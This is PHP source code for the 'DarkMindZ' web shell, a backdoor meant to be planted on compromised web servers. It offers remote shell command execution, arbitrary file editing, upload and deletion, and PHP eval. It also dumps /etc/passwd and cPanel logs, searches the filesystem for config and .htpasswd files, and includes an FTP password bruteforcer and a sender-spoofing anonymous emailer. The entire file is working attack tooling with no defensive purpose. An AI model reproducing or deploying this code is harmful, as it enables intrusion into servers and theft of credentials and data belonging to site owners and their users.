			echo '<input type="submit" value="Save modification"></form>';
			}
		else {
			$ct = "";
			echo '<textarea name="newctt" cols="50" rows="10">'.$ct.'</textarea><br>';
			echo '<input type="submit" value="Save modification"></form>';
		}
	}
	else {
		echo "File does not exists...";
	}
	echo "</table>";
	exit;
} else if ($action == "filemodgo") {
	// EDITED BY INGELO
	$nfile = $_GET['nfile'];
	if(file_exists($nfile)){
		echo 'The file <b> '.$nfile.' </b> has modified successfully!<br><br>';
		
		$newctt = stripslashes($_POST['newctt']);
		$index = fopen($nfile, "w");
		fwrite($index, $newctt);
	}
	else {
		echo 'The file <b> ' . $nfile . '</b> does not exists!<br/><br/>';
	}
	echo "</table>";
	exit;
// End Of File Modify
// Read A File
	} else if ($action == "fileread") {
echo 'Reading <b> '.$nfile.' </b> ...<br><br>';
		if(!file_exists($nfile)){
	echo "File does not exists...";
		}
	else {
		if(filesize($nfile) > 0){
	$index = fopen($nfile, "r");
	$ct = fread($index, filesize($nfile));
	$ct = htmlentities ($ct, ENT_QUOTES);
	$ct = nl2br($ct);
		}
	else {
	$ct = "Nothing in this file...";
		}
	echo $ct;
	 echo "</table>";
	 exit;
// End Read File
		}// Rename File
	} else if ($action == "filename") {
copy($nfile, $newfile);
unlink($nfile);
 echo "</table>";
 exit;
}
// End File Rename
//end of file manager
	?>
          <?php
// fast access menu
	if ($action == "comms") {
echo 'Choose command:<br><br> ';
echo '<a href="?action=passwd">=- Passwd </a><br>';
echo '<a href="?action=cfg">=- Find config* files </a><br>';
echo '<a href="?action=cfginc">=- Find config.inc.php files </a><br>';
echo '<a href="?action=cfgcurr">=- Find config* files in current dir </a><br>';
echo '<a href="?action=write">=- Find all writable folders and files </a><br>';
echo '<a href="?action=hta">=- Find all .htaccess </a><br>';
echo '<a href="?action=htp">=- Find all .htpasswd </a><br>';
echo '<a href="?action=ports">=- Opened Ports </a><br>';
echo '<a href="?action=cpanel">=- Cpanel Logs </a><br>';
echo '<a href="?action=services">=- Services Running</a><br>';
echo '<a href="?action=deldir">=- Delete all dirs.</a><br>';
echo '<a href="?action="></a><br>';
 echo "</table>";
 exit;
// End of fast access menu
// Get Passwd
	} elseif ($action == "passwd") {
$cmd = 'cat /etc/passwd';
$check = system($cmd);
		if($check){ // Check if the /etc/passwd file exists. If it does it will show it.
			echo 'The Passwd File:<br>';
			echo system($cmd);
		}
			else { // Else it will tell that it couldn't find it.
				echo "Could not find /etc/passwd..";
				}
 echo "</table>";
 exit;
}
// End of Passwd
	?>
          <?php
// tools menu
	if ($action == "tools") {
echo 'Choose a tool:<br>';
echo '<a href="?action=md5">=- MD5 Encoder </a><br>';
echo '<a href="?action=b64e">=- Base64 Encoder </a><br>';
echo '<a href="?action=b64d">=- Base64 Decoder </a><br>';
echo '<a href="?action=ftp">=- FTP Bruteforcer </a><br>';
echo '<a href="?action=bomb">=- Email Bomber </a><br>';
echo '<a href="?action=winx">=- Windows Tools </a><br>';
echo '<a href="?action=linx">=- Other OS Tools </a><br>';
 echo "</table>";
 exit;
//end of menu
// md5 encoder
	} elseif ($action == "md5") {
echo '<center>MD5 Encoder</center></br>';
echo '<center>Text:</center>';
echo '<center><form method="POST" action="?action=md5x"></center>';
echo '<center><textarea name="tot" rows="5" cols="42"></textarea></center><br>';
echo '<center><input type="submit" value="Enter"></center><br>';
 echo "</table>";
 exit;
	} elseif ($action == "md5x") {
echo 'Text Encoded: <b>' . strip_tags($_POST['tot']) . '</b><br>';
echo 'MD5 Encoder:<b><font color="lime">' .md5($_POST["tot"]). ' </font></b><br>';
 echo "</table>";
 exit;
//end of md5 encoder
// base64 encoder
	} elseif ($action == "b64e") {
echo '<center>Base64 Encoder:</center></br>';
echo '<center>Text:</center>';
echo '<center><form method="POST" action="?action=b64x1"></center>';
echo '<center><textarea name="tot" rows="5" cols="42"></textarea></center><br>';
echo '<center><input type="submit" value="Enter"></center><br>';
 echo "</table>";
 exit;
	} elseif ($action == "b64x1") {
echo 'Text Encoded: <b>' . strip_tags($_POST['tot']) . '</b><br>';
echo 'Base64 Encoder:<b><font color="lime">' .base64_encode($_POST["tot"]). '</font></b>';
 echo "</table>";
 exit;
// end of base64 encoder
// base64 decoder
	} elseif ($action == "b64d") {
echo '<center>Base64 Decoder:</center></br>';
echo '<center>Text:</center>';
echo '<center><form method="POST" action="?action=b64x2"></center>';
echo '<center><textarea name="tot" rows="5" cols="42"></textarea></center><br>';
echo '<center><input type="submit" value="Enter"></center><br>';
 echo "</table>";
 exit;
	} elseif ($action == "b64x2") {
echo 'Text Decoded: <b>' . strip_tags($_POST['tot']) . '</b><br>';
echo 'Base64 Decoder:<b><font color="lime">' .base64_decode($_POST["tot"]). '</font></b>';
 echo "</table>";
 exit;
}
// end of base64 decoder
	?>
          <?php
// kill the shell
	if ($action == "kill") {
echo '<br><br><font color="#FF0000"><strong><center>---========- WARNING -=========---</center></strong></font><br><br>';
print "<center><font color=red face=verdana size=2><center>Are you sure?<br>
<a href='$php_self?p=yes'>Yes</a> | <a href='$php_self?'>No</a></font></center><br>
Remove: <u>";
$path=__FILE__;
print $path;
print " </u>?";
echo "<br><br><br>";
echo "</table>";
exit;
	}
		if($p=="yes"){
	$path=__FILE__;
	@unlink($path);
	$path=str_replace("\\","/",$path);
		if(file_exists($path)){$hmm="Not Deleted!";
			print '<font color="red">File $path Not Deleted!</font>';
		} else {$hmm="Deleted!";}
				print "<script>alert('$path $hmm');</script>";
// end of kill shell
 echo "</table>";
 exit;
}
	?>
          <?php
// find config files
	if ($action == "cfg") {
$cmd = 'find / -type f -name "config*"';
echo 'Config Files:<br>';
system($cmd);
 echo "</table>";
 exit;
//end of find
// find config.inc
	} elseif ($action == "cfginc") {
$cmd = 'find / -type f -name config.inc.php';
echo 'Config.inc Files:<br>';
system($cmd);
 echo "</table>";
 exit;
// end of config.inc
// find config in current dir
	} elseif ($action == "cfgcurr") {
$cmd = 'find . -type f -name "config*"';
echo 'Config Files in current Dir:<br>';
system($cmd);
 echo "</table>";
 exit;
// end of find
// find writable files and folders
	} elseif ($action == "write") {
$cmd = 'find / -perm -2 -ls';
echo 'Writable files and folders:<br>';
system($cmd);
 echo "</table>";
 exit;
// end of find
// find htaccess files
	} elseif ($action == "hta") {
$cmd = 'find / -type f -name .htaccess';
echo '.Htaccess Files:<br>';
system($cmd);
 echo "</table>";
 exit;
// end of htaccess
// find htpasswd files
	} elseif ($action == "htp") {
$cmd = 'find / -type f -name .htpasswd';
echo '.Htpasswd:<br>';
system($cmd);
 echo "</table>";
 exit;
// end of find htpasswd
// find opened ports
	} elseif ($action == "ports") {
$cmd = 'netstat -an | grep -i listen';
echo 'Opened Ports:<br>';
system($cmd);
 echo "</table>";
 exit;
// end of find ports
// get cpanel logs
	} elseif ($action == "cpanel") {
$cmd = 'cat /var/cpanel/accounting.log';
echo 'Cpanel Logs:<br>';
system($cmd);
 echo "</table>";
 exit;
//end of get logs
// get running services
	} elseif ($action == "services") {
$cmd = 'ps aux';
echo 'Services Running:<br>';
system($cmd);
 echo "</table>";
 exit;
}
// end of get services running
	?>
          <?php
// usefull commands
	if ($action == "list") {
echo '<center>-= List of Commands =-</center><br>';
echo '=- pwd || Notifies you of the dir of the shell<br>';
echo '=- find -type f ! -perm -444 || Finds files that are not readable by all<br>';
echo '=- find -type d ! -perm -111 || Finds dirs not accessible by all<br>';
echo '=- ip link show || List interfaces<br>';
echo '=- host darkmindz.com || Lookup ip address for name or vice versa <br>';
echo '=- hostname -i || Lookup local ip address equivalent to host `hostname` <br>';
echo '=- netstat -tupl || List internet services on a system<br>';
echo '=- netstat -tup || List active connections to/from system<br>';
echo '=- df -h || Show free disk space<br>';
echo '=- df -i || Show free inodes<br>';
echo '=- rm -r || Removes directories and files within the directories recursively<br>';
echo '=- chmod  || change file access permissions<br>';
 echo "</table>";
 exit;
	}
// end of commands
	?>
          <?php
// FTP BruteForcer
	if ($action == "ftp") {
error_reporting(0);
$host = $_POST["host"];
$user = $_POST["user"];
$dict = $_POST["dict"];
		if (!isset($_POST['submit'])) 
	{
echo "<center><form method=\"post\" action=\"?action=ftp\"></center><br>"; 
echo "<center>Host:&nbsp;&nbsp;<input type=\"text\" name=\"host\"></center>"; 
echo "<center>User:&nbsp;&nbsp;<input type=\"text\" name=\"user\"></center>";
echo "<center>List:&nbsp;&nbsp;&nbsp;<input type=\"text\" name=\"dict\"></center><br>";
echo "<center>&nbsp;<input type=\"submit\" value=\"Start\" name=\"submit\"></center>";
echo "<center></form></center>";
echo "</table>";
exit;
} else {
	$file = fopen ($dict, "r");
	while (!feof ($file)) {
		$pass[$i] = fgets($file, 1024);
		$i++;
	} fclose($file);
echo "[o] --=[ Processing ]=--<br>";
echo "[o] |||||||||||||||||||||||||<br>";
$limit = count($pass);
$width2 = $limit;
echo "[o] Loaded ".$limit." passwords. <br>";
for ($i=0; $i<$limit; $i++){
	$ftp = ftp_connect($host, 21);
		if(ftp_login($ftp, $user, $pass[$i])){
			echo "<br>[o] Success!<br>[o] Username: ".$user."<br>[o] Password:".$pass[$i]."<br>";
		} else {
		$width = 1;
}
}
ftp_close($ftp);
echo "<br>Done.";
echo "</table>";
exit;
}
}
// End of FTP Bruteforcer
	?>
          <?php
// Anon Emailer
	if ($action == "email") {
echo '
          <div align="center"> </div></td>
      </tr>
      <tr> 
        <td width="50%" height="434" rowspan="2" nowrap bordercolor="#CCCCCC"><div align="center"> 
            <p><font size="-1">--= Send an email =--</font> </p>
            <center>
              <form method="POST" action="?action=mailgo">
                <blockquote> 
                  <p><font size="-1">-= From: 
                    <input type="text" name="exp" size="30" value="you@darkmindz.com">
                    <br>
                    <br>
                    -= To: 
                    <input type="text" name="recpt" size="30" value="loser@hotmail.com">
                    </font></p>
                </blockquote>
                <p><font size="-1"> -= Subject: 
                  <input type="text" name="topic" size="30" value="Owned By DMZ">
                  <br>
                  <br>
                  -= Content:<br>
                  <textarea name="content" cols="40" rows="6" wrap="VIRTUAL"></textarea>
                  </font><font size="-1"><br>
                  <input name="submit" type="submit" value="Send Email">
                  </font> </p>
              </form>
            </center>';
		 echo "</table>";
	     exit;
}
// end of Anon Emailer Form
	?>
          <?php
// The Emailer
	if ($action == "mailgo") {
echo '<center>Success!, Email sent to: <b>'.$recpt.'</b>.<br></center>';
$hd = $exp;
mail($recpt,$topic,$content,"From: $hd\nX-Mailer:DarkMindZ Mail System");
 echo "</table>";
 exit;
}
// end of emailer
	?>
          <?php
// Uploader Form 
	if ($action == "upload") {
echo '
          </div></td>
        <td width="50%" height="253"> <center>
            <font size="-1">--= Upload a file =-- </font> 
            <form method="POST" enctype="multipart/form-data" action="?action=upgo">
              <p align="center"><font size="-1">-= Browse: &nbsp; &nbsp; 
                <input type="file" name="file" size="30">
                </font></p>
              <p align="center"><font size="-1"> -= Rename to: 
                <input type="text" name="fts" size="30" value="your-file.txt">
                <input type="submit" value="Upload it!">
                </font></p>
            </form>
            <font size="-1"> ';
	 echo "</table>";
     exit;
}
	//End Of Upload Form
	?>
          <?php
// Uploader
	if ($action == "upgo") {
copy($file, $fts);
echo '<center>File '.$file.' Has been successfully uploaded!</center>';
 echo "</table>";
 exit;
//end of upload
}
	?>
          <?php
//Windows Tools, With the help of Gr33nW00d
	if ($action == "winx") {
	if ($win == 1) {

set_magic_quotes_runtime(0);

$veros = `ver`;
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$windir = `echo %windir%`;
//------------------------------
   if( $cmd == "" ) {
    $cmd = 'dir /OG /X';
  }
//------------------------------
print "<table  style=\"font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 9px; border: 1px #000000 dotted\"  border=\"0\" cellspacing=\"1\" cellpadding=\"2\"  >";
print    "<tr>";
print      "<td>You:</td>" ;
print      "<td> ".$_SERVER['REMOTE_ADDR']." [".$host."</font>] </td>" ;
print    "</tr>";
print    "<tr>";
print      "<td><font color=\"red\">Version OS:</font></td>" ;
print      "<td> $veros </td>";
print    "</tr>";
print    "<tr>";
print     "<td><font color=\"#990000\">Server:</font></td>";
print      "<td>".$_SERVER['SERVER_SIGNATURE']."</td>";
print    "</tr>";
print    "<tr>";
print     "<td><font color=\"#990000\">Win Dir:</font></td>";
print      "<td> $windir </td>";
print    "</tr>";
print  "</table>";
print  "<br>";
//------- [netstat -an] and [ipconfig] and [tasklist] ------------
print "<form name=\"cmd_send\" method=\"post\" action=\"?action=winx\">";
print "<input style=\"font-family: Verdana; font-size: 12px; width:10%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"submit\" name=\"cmd\" value=\"netstat -an\">";
print "&nbsp;&nbsp;&nbsp;";
print "<input style=\"font-family: Verdana; font-size: 12px; width:10%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"submit\" name=\"cmd\" value=\"ipconfig\">";
print "&nbsp;&nbsp;&nbsp;";
print "<input style=\"font-family: Verdana; font-size: 12px; width:10%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"submit\" name=\"cmd\" value=\"tasklist\">";
print "</form>";
//-------------------------------
print "<textarea style=\"width:100%; height:90% ;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" readonly>";
       system($cmd);
print "</textarea>";
print "<br>";
//-------------------------------
print "<form name=\"cmd_send\" method=\"post\" action=\"?action=winx\">";
print "<font face=\"Verdana\" size=\"1\" color=\"#990000\">CMD: </font>";
print "<br>";
print "<input style=\"font-family: Verdana; font-size: 12px; width:50%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"text\" name=\"cmd\" value=\"$cmd\">";
print " <input style = \"font-family: Verdana; font-size: 12px; background-color: #FFFFFF; border: #666666; border-style: solid; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"submit\" name=\"_run\" value=\"Run\">";
print "</form>";
} else {
echo "<center><font color='lime'><br>--=[ This Tool is OS Specific ]=--</font></center>";
}
}
// End of Windows Tools
	?>

          <?php
//Update System By Ingelo
	if (isset($_GET['update'])) {
// DONT CHANGE SHIT HERE!
$version = 1; // DONT! EVER CHANGE THIS VALUE
$downloadlink = "http://www.darkmindz.com/update/newest/";
$check = @file_get_contents("http://www.darkmindz.com/update/newest.txt");
	if($check > $version){
		echo "<center><font color='lime'>Get the latest shell here: <a href=\"" . $downloadlink . "dmzshell-v" . $check . ".txt\">--=[ DarkMindZ || The Shell ]=-- Version " . $check . "</a></font></center>";
	}
	elseif($check == $version){
		echo "<center><font color='red'>No Updates Available!</font></center><br />";
	}
	elseif($check < $version){
		echo "<center><font color='red'>You Have The Latest Version, Or there is an error in the connection, Please try again later..</font></center><br />";
	}
	else {
		echo "<center><font color='red'>Could not connect to update server! Please Try again later</font></center><br />";
}
}
// End of Update System
	?>
	<?php
if ($action == "linx") {
echo "<center><h2><font color='red'>--=[ Under Development ]=--</font></h2></center>";
}	
	?>
          <?php
// The About Section, Please Do Not Change Anything!
	if ($action == "about") {
echo "<center><h2>--=[ DarkMindZ || The Shell ]=--</h2><br>
      <font color='lime'>-=</font> <font color='red'>Author:</font> RoMeO<br>
	  <font color='lime'>-=</font> <font color='red'>Co-Dev:</font> Ingelo<br>
	  <font color='lime'>-=</font> <font color='red'>Version:</font> 1.Public<br>
	  <font color='lime'>-=</font> <font color='red'>WwW:</font> DarkMindZ.com<br>
	  <font color='lime'>-=</font> <font color='red'>Email:</font> romeo.haxxor@gmail.com<br>
	  <font color='red'>--= Shouts =--</font><br>
	  -= R4z0rblade =-<br>
	  -= wolfrat =-<br>
	  -= The DarkMindZ Community =-<br>
	  <font color='lime'>For Questions/Suggestions/Comments <a href='http://www.darkmindz.com'>DarkMindZ.com</a></font><Br><br>
      <b>|||| The End ||||</b><br><br><br><br>";
 echo "</table>";
 exit;
}
// End of About Section
	?>
          <p>&nbsp;</p></td>
      </tr>
      <tr> 
        <td height="126" colspan="2" valign="top" bordercolor="#CCCCCC"> 
	<?php
   $hexdump_lines=10;        // lines in hex preview file
   
   $hexdump_rows=24;        // 16, 24 or 32 bytes in one line

   $mkdir_mode=0755;        // chmode for new dir ('MkDir' button)

   $maxsize_fread=65536;    // read first 64Kb from any null-size file

   // USER ACCESS //

   $write_access=true;      // true - user (you) may be write/delete files/dirs
                            // false - only read access

   $phpeval_access=true;    // true - user (you) may be execute any php-code
                            // false - function eval() disable

   $system_access=true;     // true - user (you) may be run shell commands
                            // false - function system() disable
	?>
	<?php
   error_reporting(2047);
   set_magic_quotes_runtime(0);
   @set_time_limit(0);
   @ini_set('max_execution_time',0);
   @ini_set('output_buffering',0);
   if (function_exists("ob_start") && (!isset($c) || $c!="md5crack")) ob_start("ob_gzhandler");

   $self=basename($HTTP_SERVER_VARS['PHP_SELF']);

   $url="http://".getenv('HTTP_HOST').
        (getenv('SERVER_PORT')!=80 ? ":".getenv('SERVER_PORT') : "").
        $HTTP_SERVER_VARS['PHP_SELF'].
        (getenv('QUERY_STRING')!="" ? "?".getenv('QUERY_STRING') : "");
   $uurl=urlencode($url);

   //
   // antofix 'register globals': $HTTP_GET/POST_VARS -> normal vars;
   //
   $autovars1="c d f php skipphp pre nlbr xmp htmls shell skipshell pos ".
              "ftype fnot c2 confirm text df df2 df3 df4 ref from to ".
              "fatt showfile showsize root name ref names sort sortby ".
              "datetime fontname fontname2 fontsize pan limit convert fulltime fullqty";
   foreach (explode(" ",$autovars1) as $k=>$v)  {
      if (isset($HTTP_POST_VARS[$v])) $$v=$HTTP_POST_VARS[$v];
         elseif (isset($HTTP_GET_VARS[$v])) $$v=$HTTP_GET_VARS[$v];
   }

   //
   // autofix 'magic quotes':
   //
   $autovars2="php shell text d root convert";
   if (get_magic_quotes_runtime() || get_magic_quotes_gpc()) {
      foreach (explode(" ",$autovars2) as $k=>$v) {
         if (isset($$v)) $$v=stripslashes($$v);
      }
   }

   $cp_def=array(
      "001001",
      "nst2ac",
      "d/m/y H:i",
      "Tahoma",
      "9"
      );

   $panel=0;
   if (isset($HTTP_COOKIE_VARS["cp$panel"]))
      $cp=explode("~",$HTTP_COOKIE_VARS["cp$panel"]);
   else
      $cp=$cp_def;
   $cc=$cp[0];
   $cn=$cp[1];

   $cn_align=array();
   $cn_align['t']='center';
   $cn_align['n']='left';
   $cn_align['s']='right';
   $cn_align['a']='center';
   $cn_align['o']='center';
   $cn_align['g']='center';
   $cn_align['c']='center';
   $cn_align['1']='center';
   $cn_align['2']='center';
   $cn_align['3']='center';


///////////////////////////////////////////////////////////////////////////////


/*--mmstart--*/
$mm=array(
"Index of",
"View file",
"DISK",
"Info",
"Plain",
"HTML",
"Session",
"Image",
"Notepad",
"DOWNLOAD",
"Edit",
"Sorry, this programm run in read-only mode.",
"For full access: write",
"in this php-file",
"Reason",
"Error path",
"Click here for start",
"up directory",
"access denied",
"REMVIEW TOOLS",
"version",
"Free download",
"back to directory",
"Size",
"Owner",
"Group",
"FileType",
"Perms",
"Create time",
"Access time",
"MODIFY time",
"HEXDUMP PREVIEW",
"ONLY READ ACCESS",
"Can't READ file - access denied",
"full read/write access",
"FILE SYSTEM COMMANDS",
"EDIT",
"FILE",
"DELETE",
"Delete this file",
"CLEAN",
"TOUCH",
"Set current 'mtime'",
"WIPE(delete)",
"Write '0000..' and delete",
"COPY FILE",
"COPY",
"MAKE DIR",
"type full path",
"MkDir",
"CREATE NEW FILE or override old file",
"CREATE/OVERRIDE",
"select file on your local computer",
"save this file on path",
"create file name automatic",
"OR",
"type any file name",
"convert file name to lovercase",
"Send File",
"Delete all files in dir",
"Delete all dir/files recursive",
"Confirm not found (go back and set checkbox)",
"Delete cancel - File not found",
"YES",
"ME",
"NO (back)",
"Delete cancel",
"ACCESS DENIED",
"done (go back)",
"Delete ok",
"Touch cancel",
"Touch ok (set current time to 'modify time')",
"Clean (empty file) cancel",
"Clean ok (file now empty)",
"Wipe cancel - access denied",
"Wipe ok (file deleted)",
"DIR",
"Deleting all files in",
"skip",
"deleting",
"Deleting all dir/files (recursive) in",
"DONE, go back",
"DONE",
"file not found",
"ONLY READ ACCESS (don't edit!)",
"Can't READ file - access denied (don't edit!)",
"EDIT FILE",
"can't open, access denied",
"SAVE FILE (write to disk)",
"You mast checked 'create file name automatic' OR typed file name!",
"SAVING TO",
"Sorry, access denied",
"for example, uncomment next line",
"Eval PHP code",
"don't type",
"and",
"example (remove comments '#')",
"Shell commands",
"filesize to 0byte",
"from",
"to",
"Full file name",
"Can't open directory",
"setup",
"back",
"Reset all settings",
"clear",
"Current",
"Colums and sort",
"Sort order",
"Ascending sort",
"Descending sort",
"Sort by filename",
"Sort by filename extension",
"Date/time format",
"Panel font & size",
"Tools",
"Char map",
"Language",
"English",
"Russian",
"Character map (symbol codes table)",
"Select font",
"or type other",
"Font size",
"Code limit",
"Generate table",
"Universal convert"
);/*--mmstop--*/




   $language=$cc[5];
   if ($language!=1 && $language!=2) $language=1;


function mm($m) {
   global $mm,$language;
   if ($language==1) return $m;
   if (isset($mm[$m])) return $mm[$m];
   else echo "An Error Has Occured!!,, please contact RoMeO -= www.DarkMindZ.com =-";
}


switch ($language) {
case 1:
$cn_name=array(
't'=>"Type",
'n'=>"Name",
's'=>"Size",
'o'=>"Owner",
'g'=>"Group",
'a'=>"Owner/Group",
'c'=>"Perms",
'1'=>"Create",
'2'=>"Modify",
'3'=>"Access"
);
break;
case 2:
$cn_name=array(
't',
'n',
's',
'o',
'g',
'a',
'c',
'1',
'2',
'3'
);
break;
}




///////////////////////////////////////////////////////////////////////////////



   $rand=microtime();

   if (!isset($c)) $c="";
   if (!isset($d)) $d="";
   if (!isset($f)) $f="";

   ob();
   $d=str_replace("\\","/",$d);
   if ($d=="") $d=realpath("./")."/";
   if ($c=="") $c="l";
   if ($d[strlen($d)-1]!="/") $d.="/";
   $d=str_replace("\\","/",$d);
   if (!is_dir($d)) obb().die("<h3><P>".mm("Can't open directory")." <tt><font color=red><big>$d</big></font></tt>$obb");
   if (!realpath($d) || filetype($d)!="dir") obb().die("error dir type $obb");
   obb();

   //
   // OS detect:
   //
   $win=0;
   $unix=0;
   if (strlen($d)>1 && $d[1]==":") $win=1; else $unix=1;




///////////////////////////////////////////////////////////////////////////////


$html=<<<remview
<html>
<body>
<style>
A {
text-decoration : none;
}
.t {
font-size: 9pt;
text-align : center;
font-family: Verdana;
}
.t2 {
font-size: 8pt;
text-align : center;
font-family: Verdana;
}
.n {
  font-family: Fixedsys
}
.s {
font-size: 10pt;
text-align : right;
font-family: Verdana;
}
.sy {
font-family: Fixedsys;
}
.s2 {
font-family: Fixedsys;
color: red;
}
.tab {
font-size: 10pt;
text-align : center;
font-family: Verdana;
background: #3333;
}
.tr {
background: #00000;
}
</style>
remview;



function display_perms($mode)
{
if ($GLOBALS['win']) return 0;
/* Determine Type */
if( $mode & 0x1000 )
$type='p'; /* FIFO pipe */
else if( $mode & 0x2000 )
$type='c'; /* Character special */
else if( $mode & 0x4000 )
$type='d'; /* Directory */
else if( $mode & 0x6000 )
$type='b'; /* Block special */
else if( $mode & 0x8000 )
$type='-'; /* Regular */
else if( $mode & 0xA000 )
$type='l'; /* Symbolic Link */
else if( $mode & 0xC000 )
$type='s'; /* Socket */
else
$type='u'; /* UNKNOWN */

/* Determine permissions */
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';

/* Adjust for SUID, SGID and sticky bit */
if( $mode & 0x800 )
$owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 )
$group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 )
$world["execute"] = ($world['execute']=='x') ? 't' : 'T';

$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}

function _posix_getpwuid($x) {
   if ($GLOBALS['win']) return array();
   return @posix_getpwuid($x);
}

function _posix_getgrgid($x) {
   if ($GLOBALS['win']) return array();
   return @posix_getgrgid($x);
}

function up($d,$f="",$name="") {
   global $self,$win;

   $len=strlen($d."/".$f);
   if ($len<70) { $sf1="<font size=4>"; $sf2="<font size=5>"; }
   elseif ($len<90) {$sf1="<font size=3>"; $sf2="<font size=4>";}
   else {$sf1="<font size=2>"; $sf2="<font size=3>";}

   echo "<table width=100% border=0 cellspacing=0 cellpadding=4><tr><td
   bgcolor=#33333> $sf1";

   $home="<a href='$self'><font face=fixedsys size=+2>*</font></a>";
   echo $home.$sf2."<b>";
   if ($name!="") echo $name;
   else {
      if ($f=="") echo mm("Index of");
      else echo mm("View file");
   }
   echo "</b></font> ";

   $path=explode("/",$d);

   $rootdir="/";
   if ($win) $rootdir=strtoupper(substr($d,0,2))."/";

   $ss="";
   for ($i=0; $i<count($path)-1; $i++) {
      if ($i==0)
         $comm="<b>&nbsp;&nbsp;<big><b>$rootdir</b></big></b>";
      else
         $comm="$path[$i]<big><b>/</big></b>";

      $ss.=$path[$i]."/";
      echo "<a href='$self?c=l&d=".urlencode($ss)."'>$comm</a>";
      if ($i==0 && $d=="/") break;
   }
   echo "</font>";
   if ($f!="") echo "$sf1$f</font>";

   if ($win && strlen($d)<4 && $f=="") {
      echo " &nbsp; ".mm("DISK").": ";
      for ($i=ord('a'); $i<=ord('z'); $i++) {
         echo "<a href=$self?c=l&d=".chr($i).":/>".strtoupper(chr($i)).":</a> ";
      }
   }

   echo "</b></big></td><td bgcolor=#333333 width=1% align=center>
   <table width=100% border=0 cellspacing=3 cellpadding=0
   bgcolor=#33333><tr><td align=center><font size=-1><nobr><b><a
   href=$self?c=t&d=".urlencode($d).">".mm("REMVIEW TOOLS")."</a></b>
   </nobr></font></td></tr></table>
   </td></tr></table>";
}


function up_link($d,$f) {
   global $self;
   $notepad=str_replace(".","_",$f).".txt";
echo "<small>
[<a href=$self?c=i&d=".urlencode($d)."&f=".urlencode($f)."><b>".mm("Info")."</b></a>]
[<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=><b>".mm("Plain")."<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=0&fnot=1>(+)</a></b></a>]
[<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=1><b>".mm("HTML")."<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=1&fnot=1>(+)</a></b></a>]
[<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=4><b>".mm("Session")."</b></a>]
[<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=2&fnot=1><b>".mm("Image")."</b></a>]
[<a href=$self/".urlencode($notepad)."?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=3&fnot=1&fatt=".urlencode($notepad)."><b>".mm("Notepad")."</b></a>]
[<a href=$self/".urlencode($f)."?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=3&fnot=1><b>".mm("DOWNLOAD")."</b></a>]
[<a href=$self?c=e&d=".urlencode($d)."&f=".urlencode($f)."><b>".mm("Edit")."</b></a>]
</small>";
}


function exitw() {
exit("<table width=100% border=0 cellspacing=2 cellpadding=0 bgcolor=#ffdddd>
<tr><td align=center>
".mm("Sorry, this programm run in read-only mode.")."<br>
".mm("For full access: write")." `<tt><nobr><b>\$write_access=<u>true</u>;</b></nobr></tt>`
".mm("in this php-file").".</td></tr></table>
");
}



function ob() {
   global $obb_flag, $obb;
   if (!isset($obb_flag)) { $obb_flag=0; $obb=false; }
   if (function_exists("ob_start")) {
      if ($GLOBALS['obb_flag']) ob_end_clean();
      ob_start();
      $GLOBALS['obb_flag']=1;
   }
}

function obb() {
   global $obb;
   if (function_exists("ob_start")) {
      $obb=ob_get_contents();
      ob_end_clean();
      $obb="<P>
<table bgcolor=#ff0000 width=100% border=0 cellspacing=1 cellpadding=0><tr><td>
<table bgcolor=#ccccff width=100% border=0 cellspacing=0 cellpadding=3><tr><td align=center>
<b>".mm("Reason").":</b></td></tr></table>
</td></tr><tr><td>
<table bgcolor=#ffcccc width=100% border=0 cellspacing=0 cellpadding=3><tr><td>
$obb<P>
</td></tr></table>
</table><P>";
      $GLOBALS['obb_flag']=0;
   }
}

function sizeparse($size) {
   return strrev(preg_replace("!...!","\\0 ",strrev($size)));
}


function jsval($msg) {
   $msg=str_replace("\\","\\\\",$msg);
   $msg=str_replace("\"","\\\"",$msg);
   $msg=str_replace("'","\\'",$msg);
   return '"'.$msg.'",';
}



///////////////////////////////////////////////////////////////////////////


switch($c) {


// listing
case "l":

   echo $GLOBALS['html'];

   if (!realpath($d)) die("".mm("Error path").". <a href=$self>".mm("Click here for start")."</a>.");

   //up($d);

   ob();
   $di=dir($d);
   obb();

   $dirs=array();
   $files=array();

   if (!$di) exit("<a href=$self?&c=l&d=".urlencode(realpath($d."..")).
      "><nobr>&lt;&lt;&lt; <b>".mm("up directory")."</b> &gt;&gt;&gt;</nobr></a> <p>".
      "<font color=red><b>".mm("access denied")."</b></font>: $obb");
   while (false!==($name=$di->read())) {
